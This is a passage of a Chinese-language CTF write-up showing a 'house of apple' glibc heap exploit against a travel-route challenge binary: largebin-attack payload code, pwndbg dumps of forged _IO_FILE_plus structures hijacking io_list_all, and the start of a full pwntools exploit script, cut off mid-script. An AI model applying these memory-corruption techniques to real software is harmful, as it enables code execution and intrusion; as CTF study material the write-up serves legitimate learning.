chunk2 放置 largebin 内，从而通过这个处于 chunk1 内部的编辑块去覆写 chunk2 即可。</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'h'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4e0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x531</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>libcbase<span class=\"token operator\">+</span><span class=\"token number\">0x21b110</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>heapbase<span class=\"token operator\">+</span><span class=\"token number\">0x001eb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pl <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>target<span class=\"token operator\">-</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token string\">'changsha'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830115333487.png\" alt=\"image-20240830115333487\"></p>\n<p><img data-src=\"/img/house-of-apple/image-20240830115352782.png\" alt=\"image-20240830115352782\"></p>\n<p>将 free 掉的 chunk3 的 bknextsize 覆写 io_list_all-0x20，从而将 chunk0 (fake_io) 写入 io_list_all 地址处</p>\n<hr>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token string\">'guangzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># chunk0 置入 unsortbin 内</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token string\">'plane'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'fuzhou'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'nanning'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3E8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># large bin attack</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>menu<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># 调用 exit 触发 io_clearup 调用链从而输出 flag</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-apple/image-20240830115430774.png\" alt=\"image-20240830115430774\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x55555555d470</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">1</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  file <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _flags <span class=\"token operator\">=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x521</span> <span class=\"token operator\">&lt;</span>error<span class=\"token operator\">:</span> Cannot access memory at address <span class=\"token number\">0x521</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1b110</span> <span class=\"token operator\">&lt;</span>main_arena<span class=\"token operator\">+</span><span class=\"token number\">1168</span><span class=\"token operator\">></span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555deb0</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555deb0</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1b660</span> <span class=\"token operator\">&lt;</span>_nl_global_locale<span class=\"token operator\">+</span><span class=\"token number\">224</span><span class=\"token operator\">></span> <span class=\"token string\">\"¡\\335\\367\\377\\177\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x55555555d570</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    _old_offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token char\">'\\000'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1ca60</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_2_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7f81770</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    _mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  vtable <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e16dc0</span> <span class=\"token operator\">&lt;</span>_IO_wstrn_jumps<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pwndbg<span class=\"token operator\">></span> p <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE_plus</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token number\">0x55555555d570</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$<span class=\"token number\">3</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  file <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    _flags <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    _IO_read_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    _IO_read_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    _IO_read_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    _IO_write_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    _IO_write_ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x1</span> <span class=\"token operator\">&lt;</span>error<span class=\"token operator\">:</span> Cannot access memory at address <span class=\"token number\">0x1</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    _IO_write_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    _IO_buf_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    _IO_buf_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    _IO_save_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    _IO_backup_base <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    _IO_save_end <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    _markers <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    _chain <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _fileno <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    _flags2 <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    _old_offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    _cur_column <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    _vtable_offset <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token char\">'\\000'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    _shortbuf <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    _lock <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e1ca60</span> <span class=\"token operator\">&lt;</span>_IO_stdfile_2_lock<span class=\"token operator\">></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    _offset <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    _codecvt <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    _wide_data <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    _freeres_list <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    _freeres_buf <span class=\"token operator\">=</span> <span class=\"token number\">0x0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    __pad5 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    _mode <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    _unused2 <span class=\"token operator\">=</span> <span class=\"token char\">'\\000'</span> <span class=\"token operator\">&lt;</span>repeats <span class=\"token number\">19</span> times<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  vtable <span class=\"token operator\">=</span> <span class=\"token number\">0x7ffff7e16bd8</span> <span class=\"token operator\">&lt;</span>_IO_cookie_jumps<span class=\"token operator\">+</span><span class=\"token number\">88</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可见程序被我们将 io_chain 劫持到我们的 fake_io 上，从而通过调用链去输出 flag</p>\n<h5 id=\"完整exp\"><a class=\"markdownIt-Anchor\" href=\"#完整exp\">#</a> 完整 exp</h5>\n<p>在题目开启 alsr 情况写，自我认为需要去爆破 <code>point_guard_addr</code>  因此再次基础修改了一下流程，只需要爆破 2 位数即可，即 <code>1/256</code>  可以读取 flag</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> pwncli <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># host, port = \":\".split(\":\")</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>Welcome to YCB!</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>Do you like traveling? Let's start our trip from Guangzhou!</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>Since this is only the simplified version, only five cities in total can be considered at present. I'm sorry!</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>**guangzhou/nanning/changsha/nanchang/fuzhou**</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>1. Add route.</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>2. Delete route.</pre></td></tr><tr><td data-num=\"54\"></td><td><pre>3. Show route.</pre></td></tr><tr><td data-num=\"55\"></td><td><pre>4. Edit route.</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>5. Calculate the distance.</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\tru<span class=\"token punctuation\">(</span><span class=\"token string\">'5. Calculate the distance.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tsl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 